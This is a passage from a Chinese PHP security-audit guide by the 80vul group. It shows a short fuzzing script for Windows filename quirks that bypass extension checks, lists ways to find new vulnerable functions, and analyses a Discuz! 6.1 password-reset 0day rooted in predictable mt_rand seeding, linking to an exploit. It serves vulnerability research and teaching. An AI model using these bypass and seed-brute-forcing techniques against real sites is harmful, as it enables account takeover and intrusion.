str_replace提到前面了，很完美的解决了str_replace代码的安全问题，但是问题不是那么简单，上面的代码在某些系统上一样可以突破。接下来我们先看看下面的代码：<br>
<br>
<pre><code>&lt;?php<br>
for($i=0;$i&lt;255;$i++) {<br>
	$url = '1.ph'.chr($i);<br>
	$tmp = @file_get_contents($url);<br>
	if(!empty($tmp)) echo chr($i)."\r\n";<br>
}  <br>
?&gt;<br>
</code></pre>

我们在windows系统运行上面的代码得到如下字符<code>*</code> < > ? P p都可以打开目录下的1.php。<br>
<br>
<table><thead><th> <b>漏洞审计策略</b> </th></thead><tbody>
<tr><td> PHP版本要求：无<br>系统要求：无<br>审计策略：文读取件操作函数 </td></tr></tbody></table>


<h2>怎么进一步寻找新的字典</h2>

上面我们列举很多的字典，但是很多都是已经公开过的漏洞或者方式，那么我们怎么进一步找到新的字典或者利用方式呢？<br>
<br>
<ul><li>分析和学习别人发现的漏洞或者exp，总结出漏洞类型及字典<br>
</li><li>通过学习php手册或者官方文档,挖掘出新的有危害的函数或者利用方式<br>
</li><li>fuzz php的函数，找到新的有问题的函数（不一定非要溢出的），如上一章的4.6的部分很多都可以简单的fuzz脚本可以测试出来<br>
</li><li>分析php源代码，发现新的漏洞函数“特性”或者漏洞。（在上一节里介绍的那些“漏洞审计策略”里，都没有php源代码的分析，如果你要进一步找到新的字典，可以在php源代码的基础上分析下成因，然后根据这个成因来分析寻找新的漏洞函数“特性”或者漏洞。）（我们以后会陆续公布一些我们对php源代码的分析）<br>
</li><li>有条件或者机会和开发者学习，找到他们实现某些常用功能的代码的缺陷或者容易忽视的问题<br>
</li><li>你有什么要补充的吗？ ：）</li></ul>


<h2>DEMO</h2>

<table><thead><th> <b>DEMO -- Discuz! Reset User Password 0day Vulnerability 分析</b><br>（Exp:<a href='http://www.80vul.com/dzvul/sodb/14/sodb-2008-14.txt'>http://www.80vul.com/dzvul/sodb/14/sodb-2008-14.txt</a>）</th></thead><tbody>
<tr><td> PHP版本要求:php4 php5<5.2.6<br>系统要求: 无<br>审计策略:查找mt_srand/mt_rand                                                                                                                                  </td></tr></tbody></table>

第一步 安装Discuz! 6.1后利用grep查找mt_srand得到：<br>
<br>
<pre><code>heige@heige-desktop:~/dz6/upload$ grep -in 'mt_srand' -r ./ --colour -5<br>
./include/global.func.php-694-  $GLOBALS['rewritecompatible'] &amp;&amp; $name = rawurlencode($name);<br>
./include/global.func.php-695-  return '&lt;a href="tag-'.$name.'.html"'.stripslashes($extra).'&gt;';<br>
./include/global.func.php-696-}<br>
./include/global.func.php-697-<br>
./include/global.func.php-698-function random($length, $numeric = 0) {<br>
./include/global.func.php:699:  PHP_VERSION &lt; '4.2.0' &amp;&amp; mt_srand((double)microtime() * 1000000);<br>
./include/global.func.php-700-  if($numeric) {<br>
./include/global.func.php-701-          $hash = sprintf('%0'.$length.'d', mt_rand(0, pow(10, $length) - 1));<br>
./include/global.func.php-702-  } else {<br>
./include/global.func.php-703-          $hash = '';<br>
./include/global.func.php-704-          $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz';<br>
--<br>
./include/discuzcode.func.php-30-<br>
./include/discuzcode.func.php-31-if(!isset($_DCACHE['bbcodes']) || !is_array($_DCACHE['bbcodes']) || !is_array($_DCACHE['smilies'])) {<br>
./include/discuzcode.func.php-32-       @include DISCUZ_ROOT.'./forumdata/cache/cache_bbcodes.php';<br>
./include/discuzcode.func.php-33-}<br>
./include/discuzcode.func.php-34-<br>
./include/discuzcode.func.php:35:mt_srand((double)microtime() * 1000000);<br>
./include/discuzcode.func.php-36-<br>
./include/discuzcode.func.php-37-function attachtag($pid, $aid, &amp;$postlist) {<br>
./include/discuzcode.func.php-38-       global $attachrefcheck, $thumbstatus, $extcredits, $creditstrans, $ftp, $exthtml;<br>
./include/discuzcode.func.php-39-       $attach = $postlist[$pid]['attachments'][$aid];<br>
./include/discuzcode.func.php-40-       if($attach['attachimg']) {<br>
</code></pre>

有两个文件用到了mt_srand()，第1是在./include/global.func.php的随机函数random()里：<br>
<br>
<pre><code> PHP_VERSION &lt; '4.2.0' &amp;&amp; mt_srand((double)microtime() * 1000000);<br>
</code></pre>

判断了版本，如果是PHP_VERSION > '4.2.0'使用php本身默认的播种。从上一章里的分析我们可以看得出来，使用php本身默认的播种的分程序两种情况：<br>
<br>
1) 'Cross Application Attacks' 这个思路是只要目标上有使用使用的程序里定义了类似mt_srand((double)microtime() <code>*</code> 1000000)的播种的话，又很有可能被暴力。在dz这里不需要Cross Application，因为他本身有文件就定义了，就是上面的第2个文件：<br>
<br>
<pre><code>./include/discuzcode.func.php:35:mt_srand((double)microtime() * 1000000);<br>
</code></pre>

这里我们肯定dz是存在这个漏洞的，文章给出来的exp也就是基于这个的。（具体exp利用的流程有兴趣的可以自己分析下]）<br>
<br>
2) 有的人认为如果没有mt_srand((double)microtime() <code>*</code> 1000000);这里的定义，那么dz就不存在漏洞，这个是不正确的。首先你不可以保证别人使用的其他应用程序没有定义，再次不利用'Cross Application Attacks'，5.2.6>php>4.2.0 php本身默认播种的算法也不是很强悍（分析详见上），也是有可以暴力出来，只是速度要慢一点。<br>
<br>
<br>
<h2>后话</h2>

本文是80vul的三大马甲：80vul-A，80vul-B，80vul-C集体智慧的结晶，尤其是80vul-B贡献了不少新发现。另外需要感谢的是文章里提到的那些漏洞的发现者，没有他们的成果也就没有本文。本文没有写“参考”，因为本文是一个总结性的文挡，有太多的连接需要提供限于篇幅就没有一一列举，有心的读者可以自行google。另外原本没有打算公布此文，因为里面包含了太多应用程序的0day，而且有太多的不尊重别人成果的人，老是利用从别人那学到的技术来炫耀，甚至牟取利益。在这里我们希望你可以在本文里学到些东西，更加希望如果通过本文你找到了某些应用程序的0day，请低调处理，或者直接提交给官方修补，谢谢大家！！<br>
<br>
<br>
<h2>附录</h2>

<code>[</code>1<code>]</code> <a href='http://bbs.phpchina.com/attachment.php?aid=22294'>http://bbs.phpchina.com/attachment.php?aid=22294</a><br><code>[</code>2<code>]</code> <a href='http://www.php-security.org/'>http://www.php-security.org/</a><br><code>[</code>3<code>]</code> <a href='http://bugs.php.net/bug.php?id=40114'>http://bugs.php.net/bug.php?id=40114</a>